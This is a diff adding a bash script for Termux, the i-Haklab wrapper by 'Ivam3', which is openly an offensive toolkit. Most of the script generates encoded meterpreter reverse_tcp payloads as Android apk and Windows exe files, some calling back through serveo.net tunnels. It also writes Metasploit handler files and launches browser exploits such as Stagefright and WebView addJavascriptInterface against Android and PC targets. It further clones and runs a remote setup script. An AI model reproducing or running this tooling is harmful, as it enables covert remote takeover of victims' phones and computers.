@@ -1,0 +1,387 @@
+#!/data/data/com.termux/files/usr/bin/bash
+#Created on Dec/2018
+IFS=$'\n\t'
+trap ctrl_c 2
+source /data/data/com.termux/files/usr/libexec/colors
+function ctrl_c() {
+                echo
+                printf "$Y\n\n[!]$R Going me on$B Telegram$R t.me/Ivam3byCinderella$W\n\n"
+}
+function banner {
+	if [ -e $iHAKLAB/.set/libexec/banner/i-haklab ]; then
+		bash $iHAKLAB/.set/libexec/banner/i-haklab
+		sleep 1
+	fi
+}
+function k-boom {
+	if [ -e $iHAKLAB/.set/libexec/banner/k-boom ]; then
+		bash $iHAKLAB/.set/libexec/banner/k-boom
+	fi
+}
+if [ -L ~/storage/external-1 ]; then
+#	iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
+#else
+        iHAKLAB=/data/data/com.termux/files/home/i-haklab
+fi
+
+while [ $USER = "root" ]; do
+	printf "$R\n[W]:-> You need to be a common user$W\n"
+	exit
+done
+until [ -d $iHAKLAB ]; do
+	printf "$R\n[W]:-> i-Haklab needed$W |$Y Do y ou wanna install it?$W\n"
+	while read -p "       [yes/no]:-> " yesorno && [ -z $yesorno ]; do
+		continue
+	done
+if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
+	git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
+        cd ~/i-Haklab;bash setup
+else 
+	printf "$G\n[!]-> Have a nice hacking day!!\n\n"
+	exit
+fi
+done
+TOOL=$(ls $iHAKLAB/.set/to-install/ | grep -iv .zip | grep -iv instasudo | grep -iv checkroot | grep -iv i-haklab_login | grep -iv functions | grep -n -iv lock)
+TARGET=(0 1 2 3 29)
+SSH=$(netstat | grep -c "ssh")
+LOCALHOST=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
+CHECKROOT=$(bash $iHAKLAB/.set/to-install/check-root)
+if [ $CHECKROOT = "root" ]; then
+	LPORT=80
+else
+	LPORT=4546
+fi
+if [ -z $1 ] || [ $1 = help ]; then
+	banner
+	printf "$Y\n[i]->$W i-Haklab v.1.0 (c) 2019 by Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. Please do not use in military or secret service organizations, or for illegal purposes.\n\nSyntax: i-Haklab [-arg-] [-option-]\n
+Arguments  |    Options     |    Description
+╰─help─────➤────────────────➤ Show this help menu
+╰─list─────➤────────────────➤ List all available tools/frameworks
+╰─show─────➤──tools/books───➤ Show tools details and books availables
+|   ╰──────➤──tutorials/QG──➤ Show tutorials and Quick Guides availables
+╰─install──➤───tool/book────➤ Install tools or books
+╰─remove───➤─────tool───────➤ Remove tools
+╰─weechat──➤────────────────➤ Connect with irc Ivam3byCinderella chat
+╰─update───➤────────────────➤ Update i-Haklab
+╰─upgrade──➤────────────────➤ upgrade i-Haklab by installing/upgrading tools
+╰─version──➤────────────────➤ Show i-Haklab version installed
+           |       |        |
+   [--] Automatitation Arguments [--]
+Arguments  |    options     |    Description
+╰─handler──➤──file.rc name──➤ Start handler on msfconsole with previous setting
+╰───apk────➤──inlan/outlan──➤ Create a coded payload apk with msfvenom
+|               ╰─────|─────➤ LPORT=4546 Payload=android/meterpreter/reverse_tcp apk=inlan.apk
+|                     ╰─────➤ LPORT=48263 LHOST=serveo.net apk=outlan.apk
+|                             Payload=android/meterpreter/reverse_tcp
+╰─paylink──➤─pc/nexam/soa5──➤ Create a link payload with handler
+|             ╰───|────|────➤ For targets [0]generic, [1]windows, [2]macOS and [3]linux
+|                 |    |      example: i-Haklab paylink pc 2
+|                 ╰────|────➤ For targets [0]nexxus and [29]samsung
+|                      |      example: i-Haklab paylink nexam 29
+|                      ╰────➤ For android operative system equal at version 5 to down
+╰──payexe──➤──inlan/outlan──➤ Create a coded payload .exe with msfvenom
+|               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp file=inlan.exe
+|                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
+|                             LHOST=serveo.net apk=outlan.apk
+╰─serveo───➤────────────────➤ Start a SSH client to request TCP port forwarding from the server and proxy
+|    ╰─────➤────domain──────➤ Start a SSH client to request port forwarding with especific dns\n\n"
+elif [ $1 = list ]; then
+	banner
+	printf "$TOOL"
+elif [ $1 = show ] && [ -z $2 ]; then
+        printf "$R[w]->$W Show argument need an option\n"
+elif [ $1 = show ] && [ $2 ]; then
+	TOOL=$(ls $iHAKLAB/.set/libexec/Readme/ | grep $2)
+	if [ "$TOOL" = $2 ]; then
+		banner
+		cat $iHAKLAB/.set/libexec/Readme/$2
+		echo
+	elif [ $2 = books ] && [ $3 = $BOOK ]; then
+		banner
+		cat $iHAKLAB/.set/libexec/Books/List | awk '{print $1,$2}'
+		echo
+	elif [ $2 = tutorials ]; then
+		banner
+		cat $iHAKLAB/.set/libexec/Tutorials/List
+		printf "$G\n[?]─> Choose one option:─➤ "
+		read ANSW
+		let TUTO=$(cat $iHAKLAB/.set/libexec/Tutorials/List | grep -oE $ANSW )
+		if [ "$ANSW" = $TUTO ]; then
+			command -v termux-open > /dev/null || { printf "$R[w]->$W termux-tools needed$R |$W please install it"; exit; }
+			termux-open https://t.me/Ivam3byCinderella/$ANSW
+		else
+			clear
+			banner
+			printf "$R[w]->$W Unable to locate option $ANSW\n"
+		fi
+	elif [ $2 = QG ]; then
+		if [ -d $iHAKLAB/QuickGuides ]; then
+			banner
+			ls $iHAKLAB/QuickGuides
+			echo
+		else
+			printf "$R[w]->$W Quick Guides was removed$R |$W please install it\n"
+		fi
+	else
+		printf "$R[w]->$W Unable to locate option $2\n"
+	fi
+elif [ $1 = install ] && [ -z $2 ]; then
+	printf "$R[w]->$W Install argument need an option\n"
+elif [ $1 = install ] && [ $2 ]; then
+	banner
+	TOOL=$(ls $iHAKLAB/.set/to-install/ | grep -iv .zip | grep $2)
+	if [ $2 = "books" ] && [ -z $3 ]; then
+		printf "$R[w]->$W Book option needs the book number\n"
+	elif [ $2 = "books" ] && [ ! -z $3 ]; then
+		BOOK=$(cat -n $iHAKLAB/.set/libexec/Books/List | grep $3 | awk '{print $NF}')
+		megadl https://mega.nz/$BOOK
+	elif [ "$TOOL" = $2 ]; then
+		bash $iHAKLAB/.set/to-install/$TOOL
+	else
+		printf "$R[w]->$W Unable to locate tool or book $2\n"
+		sleep 1
+		printf "$G[i]->$W Trying with apptitude repositories . . .\n"
+		sleep 1
+		apt install $2 -y
+	fi
+elif [ $1 = remove ] && [ -z $2 ]; then
+        printf "$R[w]->$W remove argument need an option\n"
+elif [ $1 = remove ] && [ $2 ]; then
+        TOOL=$(ls $iHAKLAB/.set/to-remove | grep -iv .zip | grep $2)
+        if [ "$TOOL" = $2 ]; then
+		banner
+		bash $iHAKLAB/.set/to-remove/$TOOL
+		k-boom
+	elif [ -e $PREFIX/bin/$2 ]; then
+		banner
+		apt remove $2 -y
+		apt autoremove -y
+		k-boom
+	else
+		printf "$R[w]->$W Unable to locate tool/framework $2\n"
+	fi
+elif [ $1 = weechat ]; then
+	banner
+	if [ ! -e $PREFIX/bin/weechat ]; then
+		apt install weechat -y
+	fi
+	printf "$Y\n   [!]->$W After start weechat type the next commands$Y <-[!]$Y\n/server add freenode chat.freenode.net/6697 -ssl -autoconnect\n                  /connect freenode\n                 /nick your-nickname\n              /join #Ivam3byCinderella$G\n\n                Press enter to start\n"
+	read enter
+	weechat
+	k-boom
+elif [ $1 = update ]; then
+	banner
+	CHECK=$(cd $iHAKLAB;git pull | grep -oE Already)
+	if $CHECK; then 
+		printf "$G\n[i]->$W Already up to date$G <-[i]$W\n"
+	else
+		printf "$Y\n[i]->$W There is a new version, run i-Haklab upgrade$Y <-[i]$W\n"
+	fi
+elif [ $1 = upgrade ]; then
+	banner
+	cd $iHAKLAB;git pull > /dev/null
+	bash $iHAKLAB/.set/libexec/upgrade
+elif [ $1 = version ]; then
+	banner
+	cat $iHAKLAB/README.md | grep -o v.*.*.9
+elif [ $1 = apk ] && [ -z $2 ]; then
+	printf "$R[w]->$W apk argument need an option\n"
+elif [ $1 = apk ] && [ $2 ]; then
+	if [ $2 = inlan ]; then
+		banner
+		if [ ! -d ~/java/handler ]; then
+			mkdir -p ~/java/handler
+		fi
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -e x86/shikata_ga_nai -i 5 -o inlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
+		echo "use exploit/multi/handler" > ~/java/handler/inlan.apk.rc
+		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/inlan.apk.rc
+		echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.apk.rc
+		echo "set LPORT 4546" >> ~/java/handler/inlan.apk.rc
+		echo "set run" >> ~/java/handler/inlan.apk.rc
+		printf "$Y[i]->$W Payload saved as$G inlan.apk$W\n"
+		printf "$Y[i]->$W Handler file saved as$G inlan.apk.rc$W\n"
+	elif [ $2 = outlan ]; then
+		banner
+		if [ ! -d ~/java/handler ]; then
+			mkdir -p ~/java/handler
+		fi
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -e x86/shikata_ga_nai -i 5 -o outlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n" 
+		echo "use exploit/multi/handler" > ~/java/handler/outlan.apk.rc
+		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/outlan.apk.rc
+		echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.apk.rc
+		echo "set LPORT 4546" >> ~/java/handler/outlan.apk.rc
+		echo "set run" >> ~/java/handler/outlan.apk.rc
+		printf "$Y[i]->$W Payload saved as$G outlan.apk$W\n"
+		printf "$Y[i]->$W Handler file saved as$G outlan.apk.rc$W\n"
+	else
+		printf "$R[w]->$W invalid option\n"
+	fi
+elif [ $1 = payexe ] && [ -z $2 ]; then
+        printf "$R[w]->$W payexe argument need an option\n"
+elif [ $1 = payexe ] && [ $2 ]; then
+        if [ $2 = inlan ]; then
+                banner
+		if [ ! -d ~/java/handler ]; then
+			mkdir -p ~/java/handler
+		fi
+                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -f exe -e x86/shikata_ga_nai -i 5 -o inlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
+                echo "use exploit/multi/handler" > ~/java/handler/inlan.exe.rc
+                echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/inlan.exe.rc
+                echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.exe.rc
+                echo "set LPORT 4546" >> ~/java/handler/inlan.ex.rc
+                echo "set run" >> ~/java/handler/inlan.exe.rc
+                printf "$Y[i]->$W Payload saved as$G inlan.exe$W\n"
+                printf "$Y[i]->$W Handler file saved as$G inlan.exe.rc$W\n"
+        elif [ $2 = outlan ]; then
+                banner
+		if [ ! -d ~/java/handler ]; then
+			mkdir -p ~/java/handler
+		fi
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -f exe -e x86/shikata_ga_nai -i 5 -o outlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
+                echo "use exploit/multi/handler" > ~/java/handler/outlan.exe.rc
+                echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/outlan.exe.rc
+                echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.exe.rc
+                echo "set LPORT 4546" >> ~/java/handler/outlan.exe.rc
+                echo "set run" >> ~/java/handler/outlan.exe.rc
+                printf "$Y[i]->$W Payload saved as$G outlan.exe$W\n"
+                printf "$Y[i]->$W Handler file saved as$G outlan.exe.rc$W\n"
+        else
+                printf "$R[w]->$W invalid option\n"
+        fi
+elif [ $1 = paylink ] && [ -z $2 ]; then
+	printf "$R[w]->$W pc options need a target\n"
+elif [ $1 = paylink ] && [ $2 = pc ] && [ -z $3 ]; then
+	printf "$R[w]->$W pc options need a target\n"
+elif [ $1 = paylink ] && [ $2 = pc ] && [ $3 ]; then
+	until [ -d ~/java/handler/ ]; do
+		printf "$R[w]->$W The hanlder box is empty\n"
+		exit
+	done
+	for i in ${TARGET[*]}; do
+		if [ $3 = $i ]; then
+			if [ ! -e ~/java/handler/paylink-pc-$3.rc ]; then
+				banner
+				echo "use exploit/multi/browser/java_jre17_jmxbean_2" > ~/java/handler/paylink-pc-$3.rc
+				echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-pc-$3.rc
+				echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-pc-$3.rc
+				echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-pc-$3.rc
+				echo "set LPORT $LPORT" >> ~/java/handler/paylink-pc-$3.rc
+				echo "set URIPATH /" >> ~/java/handler/paylink-pc-$3.rc
+				echo "set target $3" >> ~/java/handler/paylink-pc-$3.rc
+				echo "run" >> ~/java/handler/paylink-pc-$3.rc
+				if [ $CHECKROOT = "root" ]; then
+					command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
+					printf "$Y[i]->$W Handler file saved as$G paylink-pc-$3.rc$W\n"
+					sleep 1
+					sudo msfconsole -q -r ~/java/handler/paylink-pc-$3.rc
+				else
+					printf "$Y[i]->$W Handler file saved as$G paylink-pc-$3.rc$W\n"
+					sleep 1
+					msfconsole -q -r ~/java/handler/paylink-pc-$3.rc
+				fi
+			else
+				printf "$R[w]->$W File paylink-pc-$3.rc already exist\n"
+			fi
+		fi
+	done
+elif [ $1 = paylink ] && [ $2 = nexam ] && [ -z $3 ]; then
+        printf "$R[w]->$W nexam option need a target\n"
+elif [ $1 = paylink ] && [ $2 = nexam ] && [ $3 ]; then
+        until [ -d ~/java/handler/ ]; do
+                printf "$R[w]->$W The hanlder box is empty\n"
+                exit
+        done
+        for i in ${TARGET[*]}; do
+                if [ $3 = $i ]; then
+                        if [ ! -e ~/java/handler/paylink-nexam-$3.rc ]; then
+				banner
+                                echo "use exploit/android/browser/stagefright_mp4_tx3g_64bit" > ~/java/handler/paylink-nexam-$3.rc
+                                echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-nexam-$3.rc
+                                echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-nexam-$3.rc
+                                echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-nexam-$3.rc
+                                echo "set LPORT $LPORT" >> ~/java/handler/paylink-nexam-$3.rc
+                                echo "set URIPATH /" >> ~/java/handler/paylink-nexam-$3.rc
+                                echo "set target $3" >> ~/java/handler/paylink-nexam-$3.rc
+                                echo "run" >> ~/java/handler/paylink-nexam-$3.rc
+                                if [ $CHECKROOT = "root" ]; then
+					command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
+					printf "$Y[i]->$W Handler file saved as$G paylink-nexam-$3.rc$W\n"
+					sleep 1
+                                        sudo msfconsole -q -r ~/java/handler/paylink-nexam-$3.rc
+                                else
+					printf "$Y[i]->$W Handler file saved as$G paylink-nexam-$3.rc$W\n"
+					sleep 1
+                                        msfconsole -q -r ~/java/handler/paylink-nexam-$3.rc
+                                fi
+                        else
+                                printf "$R[w]->$W File paylink-nexam-$3.rc already exist\n"
+                        fi
+                fi
+        done
+elif [ $1 = paylink ] && [ $2 = soa5 ]; then
+        until [ -d ~/java/handler/ ]; do
+                printf "$R[w]->$W The hanlder box is empty\n"
+                exit
+        done
+	if [ ! -e ~/java/handler/paylink-soa5.rc ]; then
+		banner
+		echo "use exploit/android/browser/webview_addjavascriptinterface" > ~/java/handler/paylink-soa5.rc
+                echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-soa5.rc
+                echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-soa5.rc
+                echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-soa5.rc
+                echo "set LPORT $LPORT" >> ~/java/handler/paylink-soa5.rc
+                echo "set URIPATH /" >> ~/java/handler/paylink-soa5.rc
+                echo "run" >> ~/java/handler/paylink-soa5.rc
+		if [ $CHECKROOT = "root" ]; then
+			command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
+			printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
+			sleep 1
+			sudo msfconsole -q -r ~/java/handler/paylink-soa5.rc
+                else
+			printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
+			sleep 1
+                        msfconsole -q -r ~/java/handler/paylink-soa5.rc
+                fi
+        else
+                printf "$R[w]->$W File paylink-nexam-soa5.rc already exist\n"
+        fi
+elif [ $1 = serveo ] && [ -z $2 ]; then
+	command -v ssh > /dev/null || { printf "$R\n[W]->$W ssh not found$R |$W run apt install openssh"; exit; }
+	if [ $SSH = "1" ]; then 
+		killall -2 ssh > /dev/null
+	fi
+	banner
+	ssh -R 48263:$LOCALHOST:4546 serveo.net
+elif [ $1 = serveo ] && [ $2 ]; then
+	LINK=$2
+	command -v ssh > /dev/null printf "$R\n[W]->$W ssh not found$R |$W run apt install openssh"
+	if [ $SSH = "1" ]; then 
+		killall -2 ssh > /dev/null 
+	fi
+	banner
+	ssh -R $LINK:80:$LOCALHOST:$LPORT serveo.net
+elif [ $1 = handler ] && [ -z $2 ]; then
+	banner
+	printf "$R[w]->$W handler argument need an option$R |$W use one of those:\n"
+	if [ -d ~/java/handler ]; then
+		ls ~/java/handler | grep .rc | sort
+	else
+		printf "$R[w]->$W The hanlder box is empty\n"
+	fi
+elif [ $1 = handler ] && [ $2 ]; then
+	if [ -e ~/java/handler/$2 ]; then
+		if [ $CHECKROOT = "root" ]; then
+			command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
+			banner
+			sudo msfconsole -q -r ~/java/handler/$2
+		else 
+			banner
+			msfconsole -q -r ~/java/handler/$2
+		fi
+	else
+		printf "$R[w]->$W File $2 doesn't exist\n"
+	fi
+else
+	printf "$R[w]->$W Invalid argument $1 $R|$W Use help to main menu\n"
+fi
+#                                               @Ivam3
